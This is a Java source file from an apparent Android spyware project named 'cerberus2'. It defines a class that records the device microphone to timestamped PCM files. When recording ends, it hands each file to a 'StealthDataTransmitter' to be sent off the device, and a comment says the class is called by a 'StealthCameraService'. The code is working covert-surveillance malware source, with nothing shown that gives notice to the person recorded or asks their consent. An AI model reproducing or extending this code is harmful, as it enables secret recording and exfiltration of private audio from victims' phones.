package com.example.cerberus2;

import android.content.Context;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Log;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class AudioRecorder {

    private static final String TAG = "AudioRecorder";
    private static final String AUDIO_DIR = "AudioRecordings";

    private static final int SAMPLE_RATE = 16000;
    private static final int CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO;
    private static final int AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT;

    private final Context context;
    private final String deviceId;
    private final StealthDataTransmitter dataTransmitter;

    private AudioRecord audioRecord;
    private Thread recordingThread;
    private boolean isRecording = false;

    private File currentFile;
    private FileOutputStream fos;

    // Новый конструктор (именно тот, который вызывает StealthCameraService)
    public AudioRecorder(Context context, String deviceId, StealthDataTransmitter dataTransmitter) {
        this.context = context;
        this.deviceId = deviceId;
        this.dataTransmitter = dataTransmitter;
    }

    public void startRecording() {
        if (isRecording) {
            Log.w(TAG, "Recording is already in progress");
            return;
        }

        try {
            int bufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT);
            if (bufferSize == AudioRecord.ERROR_BAD_VALUE) {
                throw new IOException("Invalid buffer size");
            }

            audioRecord = new AudioRecord(
                    MediaRecorder.AudioSource.DEFAULT,
                    SAMPLE_RATE,
                    CHANNEL_CONFIG,
                    AUDIO_FORMAT,
                    bufferSize * 4
            );

            if (audioRecord.getState() != AudioRecord.STATE_INITIALIZED) {
                throw new IOException("AudioRecord initialization failed");
            }

            // Создаём файл для записи
            currentFile = createAudioFile();
            fos = new FileOutputStream(currentFile);

            audioRecord.startRecording();
            isRecording = true;

            Log.d(TAG, "Audio recording started. DeviceID: " + deviceId);

            recordingThread = new Thread(new RecordingTask());
            recordingThread.start();

        } catch (Exception e) {
            Log.e(TAG, "Failed to start recording", e);
            stopRecording();
        }
    }

    public void stopRecording() {
        if (!isRecording) return;

        isRecording = false;

        if (audioRecord != null) {
            try {
                audioRecord.stop();
            } catch (Exception ignored) {}
            audioRecord.release();
            audioRecord = null;
        }

        if (recordingThread != null) {
            try {
                recordingThread.join(1000);
            } catch (InterruptedException e) {
                Log.e(TAG, "Interrupted while stopping recording thread", e);
            }
            recordingThread = null;
        }

        // Закрываем поток записи
        if (fos != null) {
            try {
                fos.close();
            } catch (IOException e) {
                Log.e(TAG, "Error closing file output stream", e);
            }
            fos = null;
        }

        Log.d(TAG, "Recording stopped. File: " + (currentFile != null ? currentFile.getAbsolutePath() : "null"));

        // Отправляем готовый файл через StealthDataTransmitter
        if (currentFile != null && currentFile.exists() && dataTransmitter != null) {
            dataTransmitter.sendFile(currentFile.getAbsolutePath());
        }
    }

    private class RecordingTask implements Runnable {
        @Override
        public void run() {
            byte[] buffer = new byte[2048];

            while (isRecording && audioRecord != null) {
                int bytesRead = audioRecord.read(buffer, 0, buffer.length);
                if (bytesRead > 0 && fos != null) {
                    try {
                        fos.write(buffer, 0, bytesRead);
                    } catch (IOException e) {
                        Log.e(TAG, "Error writing audio data", e);
                        break;
                    }
                }
            }
        }
    }

    private File createAudioFile() {
        String fileName = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault())
                .format(new Date()) + "_audio.pcm";

        File audioDir = new File(context.getExternalFilesDir(Environment.DIRECTORY_MUSIC), AUDIO_DIR);
        if (!audioDir.exists()) {
            audioDir.mkdirs();
        }

        return new File(audioDir, fileName);
    }

    // Геттер на случай, если где-то понадобится текущий файл
    public File getCurrentFile() {
        return currentFile;
    }
}
